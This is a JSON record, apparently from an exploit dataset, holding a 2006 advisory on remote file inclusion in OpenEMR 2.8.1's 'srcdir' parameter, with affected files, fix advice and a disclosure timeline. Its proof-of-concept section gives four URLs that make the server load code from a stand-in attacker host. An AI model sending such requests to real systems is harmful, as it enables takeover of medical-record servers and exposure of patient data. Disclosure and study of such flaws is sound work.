{
  "id": "2727",
  "title": "OpenEMR 2.8.1 - &#039;srcdir&#039; Multiple Remote File Inclusions",
  "cve": "CVE-2006-5811",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/                              .OR.ID\r\nECHO_ADV_60$2006\r\n\r\n-----------------------------------------------------------------------------------------------\r\n[ECHO_ADV_60$2006] OpenEMR <=2.8.1 Multiple Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------------\r\n\r\nAuthor\t\t: Dedi Dwianto a.k.a the_day\r\nDate Found\t: November, 01nd 2006\r\nLocation\t: Indonesia, Jakarta\r\nweb\t\t: http://advisories.echo.or.id/adv/adv60-theday-2006.txt\r\nCritical Lvl\t: Highly critical\r\nImpact\t\t: System access\r\nWhere\t\t: From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication\t: OpenEMR\r\nversion\t\t: <=2.8.1\r\nURL\t\t: http://www.oemr.org\r\n\r\nOpenEMR is Open Source electronic medical record and medical practice management software. \r\nOpenEMR is best described as a \"system\" of programs. The main OpenEMR program consists of the electronic\r\nhealth records and scheduling software. \r\nOpenEMR can also be configured for insurance billing with FreeB, accounting with SQL-Ledger,\r\nand access controls with php-GACL.\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~\r\n\r\nI found vulnerability in interface/billing/billing_process.php\r\n-----------------------interface/billing/billing_process.php-------------\r\n....\r\n<?\r\n...\r\ninclude_once(\"$srcdir/patient.inc\");\r\ninclude_once(\"$srcdir/billrep.inc\");\r\n...\r\n----------------------------------------------------------\r\n\r\nInput passed to the \"$srcdir\" parameter in billing_process.php is not\r\nproperly verified before being used. This can be exploited to execute\r\narbitrary PHP code by including files from local or external\r\nresources.\r\n\r\n\r\nAlso affected files :\r\n\r\ninterface/billing/billing_report.php\r\ninterface/billing/billing_report_xml.php\r\ninterface/billing/print_billing_report.php\r\nlogin.php\r\ninterface/batchcom/batchcom.php\r\ninterface/login/login.php\r\ninterface/main/main_info.php\r\ninterface/main/main.php\r\ninterface/new/new_patient_save.php\r\ninterface/practice/ins_search.php\r\ninterface/logout.php\r\ninterface/reports/custom_report_range.php\r\ninterface/reports/players_report.php\r\ninterface/reports/front_receipts_report.php\r\ninterface/usergroup/facility_admin.php\r\ninterface/usergroup/usergroup_admin.php\r\ninterface/usergroup/user_info.php\r\ninterface/usergroup/facility_admin.php\r\ninterface/usergroup/facility_admin.php\r\ncustom/import_xml.php\r\n\r\nNew Vulnerability in OpenEMR Version 2.8.1\r\n----library/translation.inc.php----\r\n<?\r\n....\r\ninclude_once($GLOBALS['srcdir'] . '/sql.inc');\r\n....\r\n?>\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[OpenEMR-path]/interface/billing/billing_process.php?srcdir=http://atacker.com/inject.txt?\r\nhttp://target.com/[OpenEMR-path]/interface/new/new_patient_save.php?srcdir=http://atacker.com/inject.txt?\r\nhttp://target.com/[OpenEMR-path]/login.php?srcdir=http://atacker.com/inject.txt?\r\nhttp://target.com/[OpenEMR-path]/library/translation.inc.php?GLOBALS[srcdir]=http://atacker.com/inject.txt?\r\n\r\n\r\n\r\nSolution:\r\n~~~~~~~\r\n\r\n- Sanitize variable $srcdir affected files.\r\n- Turn off register_globals\r\n\r\nTimeline :\r\n~~~~~~~~~\r\n\r\n01 - 11 - 2006 bugs found\r\n01 - 11 - 2006 vendor contacted\r\n07 - 11 - 2006 public disclosure\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~\r\n~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous\r\n~ Jessy My Brain\r\n~ az001,bomm_3x,matdhule,angelia\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel - #e-c-h-o @irc.dal.net\r\n------------------------------------------------------------------------\r\n---\r\nContact:\r\n~~~~\r\n     EcHo Research & Development Center\r\n     the_day[at]echo[dot]or[dot]id\r\n     \r\n-------------------------------- [ EOF ]----------------------------------\r\n\r\n# milw0rm.com [2006-11-06]",
  "url": "https://www.exploit-db.com/exploits/2727"
}